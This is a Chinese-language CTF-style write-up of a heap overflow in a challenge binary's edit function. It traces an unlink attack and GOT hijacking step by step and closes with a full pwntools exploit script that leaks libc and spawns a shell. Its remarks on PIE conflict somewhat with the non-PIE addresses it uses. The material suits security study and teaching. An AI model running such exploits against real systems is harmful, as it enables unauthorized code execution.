## 漏洞成因

### 关键数据结构
```c
// 全局指针数组，存储分配的内存块指针
void *::s[?];  // 地址在运行时确定（受PIE影响）

// 全局索引计数器
int dword_602100;  // 记录当前分配的块数量
```

### 漏洞分析
**漏洞位置**：`sub_4009E8`函数（选项2 - 写入功能）

**漏洞类型**：堆溢出漏洞

**根本原因**：
```c
fgets(s, 16, stdin);
n = atoll(s);  // 用户可控制写入大小
ptr = (&::s)[v2];
for ( i = fread(ptr, 1u, n, stdin); i > 0; i = fread(ptr, 1u, n, stdin) )
{
  ptr += i;
  n -= i;
}
```

**漏洞机理**：
1. **缺失边界检查**：函数接受用户指定的写入大小`n`，但未验证是否超过实际分配的内存大小
2. **无条件循环写入**：`fread`循环持续写入数据，直到达到用户指定的字节数，无视内存边界
3. **基于攻击者控制的输入**：攻击者可分配小内存块，然后指定大尺寸进行写入，实现堆溢出

**利用后果**：通过精心构造的溢出数据，可以：
- 覆盖相邻堆块的元数据（size、prev_size字段）
- 修改堆管理结构（chunk header）
- 实现任意地址读写
- 最终执行任意代码

## 漏洞利用过程

### 利用步骤及内存变化

| 步骤 | 操作 | 内存关键变化 | 利用目的 |
|------|------|--------------|----------|
| 1 | `alloc(0x100); alloc(0x30); alloc(0x80)` | - 堆布局：3个连续chunk<br>- 全局数组`::s`指向分配的堆块<br>- Chunk 1(0x30)与Chunk 2(0x80)相邻 | 创建攻击所需的堆布局 |
| 2 | `edit(2, len(payload), payload)` | - Chunk 1用户数据被伪造chunk结构覆盖<br>- Chunk 2的prev_size被修改为0x30<br>- 伪造fd/bk指向全局数组附近 | 准备unlink攻击的伪造chunk |
| 3 | `free(3)` | - 触发unlink操作<br>- 全局数组索引2被修改为`0x602138`<br>- 获得任意地址读写能力 | 通过unlink实现指针劫持 |
| 4 | `edit(2, len(payload2), payload2)` | - 全局数组`::s`被重写为GOT表地址<br>- `::s[0]`→free@got, `::s[1]`→puts@got, `::s[2]`→atoi@got | 建立GOT表修改通道 |
| 5 | `edit(0, len(payload3), payload3)` | - free@got.plt被修改为puts@plt<br>- 控制流劫持：调用free实际执行puts | 实现函数重定向用于信息泄露 |
| 6 | `free(1)` | - 实际调用puts函数<br>- 泄露libc中puts函数地址<br>- 计算libc基址和system地址 | 绕过ASLR，获取关键函数地址 |
| 7 | `edit(2, len(payload4), payload4)` | - atoi@got.plt被修改为system地址<br>- 为任意命令执行做准备 | 部署最终攻击载荷 |
| 8 | `p.interactive()` | - 程序控制权移交<br>- 可执行system("/bin/sh")获得shell | 实现权限提升 |

### 堆内存布局演变
```

[Top Chunk]

步骤1后:
[Chunk0:0x100][Chunk1:0x30][Chunk2:0x80][Top Chunk]

步骤2后:
[Chunk0:0x100][伪造的Chunk1][被修改的Chunk2头部][Top Chunk]

步骤3后:
[Chunk0:0x100][空闲Chunk1][Chunk2:0x80][Top Chunk]
(全局指针被unlink修改)

```

## Exploit

```python
from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = process('./data/sample0')
elf = ELF('./data/sample0')
libc = elf.libc
g_pointer = 0x602140  # 注意：实际运行时因PIE此地址会变化，需要泄漏

def alloc(size:int):
    p.sendline(b'1')
    p.sendline(str(size).encode())
    return p.recv()

def edit(idx:int, size:bytes, content:str):
    p.sendline(b'2')
    p.sendline(str(idx).encode())
    p.sendline(str(size).encode())  # 漏洞点：size参数未验证边界
    if type(content)==str:
        p.sendline(content.encode())
    elif type(content)==bytes:
        p.sendline(content)
    return p.recv()

def free(idx):
    p.sendline(b'3')
    p.sendline(str(idx).encode())
    return p.recv()

def show(idx):
    p.sendline(b'4')
    p.sendline(str(idx).encode())
    return p.recv()

# 步骤1: 创建堆布局
alloc(0x100)
alloc(0x30)  # 小chunk，用于溢出攻击
alloc(0x80)  # 相邻chunk，溢出目标

# 步骤2: 构造unlink攻击payload
# 伪造一个chunk结构，fd/bk指向全局数组附近
payload = p64(0) + p64(0x20) + p64(g_pointer+16-0x18) + p64(g_pointer+16-0x10) + p64(0x20) + b'a'*8 + p64(0x30) + p64(0x90)
edit(2, len(payload), payload)  # 堆溢出：写入超过分配大小

# 步骤3: 触发unlink攻击
free(3)  # 释放触发unlink，修改全局指针

# 步骤4: 重定向全局指针到GOT表
payload2 = b'b'*8 + p64(elf.got['free']) + p64(elf.got['puts']) + p64(elf.got['atoi'])
edit(2, len(payload2), payload2)  # 现在通过索引2可以修改GOT表

# 步骤5: 劫持free函数为puts
payload3 = p64(elf.plt['puts'])
edit(0, len(payload3), payload3)  # 修改free@got指向puts@plt

# 步骤6: 泄露libc地址
ret = '0x' + free(1)[:6][::-1].hex()  # 调用free(1)实际执行puts，泄露地址
puts_addr = int(ret, 16)
libc_addr = puts_addr - libc.sym['puts']  # 计算libc基址
system_addr = libc_addr + libc.sym['system']  # 计算system地址

# 步骤7: 部署system函数
payload4 = p64(system_addr)
edit(2, len(payload4), payload4)  # 修改atoi@got指向system

# 步骤8: 获取shell
p.interactive()  # 现在调用atoi将执行system，可获得shell
```

### 关键注释说明
- **漏洞利用核心**：利用选项2的堆溢出漏洞，通过精心构造的payload实现内存破坏
- **unlink攻击**：通过伪造chunk结构和触发free操作，实现任意地址写
- **GOT劫持**：修改全局函数指针，重定向控制流
- **信息泄露**：利用puts泄露libc地址，绕过ASLR
- **最终利用**：将atoi替换为system，实现任意命令执行

**注意**：实际利用中因PIE保护，硬编码地址`g_pointer = 0x602140`可能失效，需要先泄漏实际地址或使用其他技术绕过PIE。
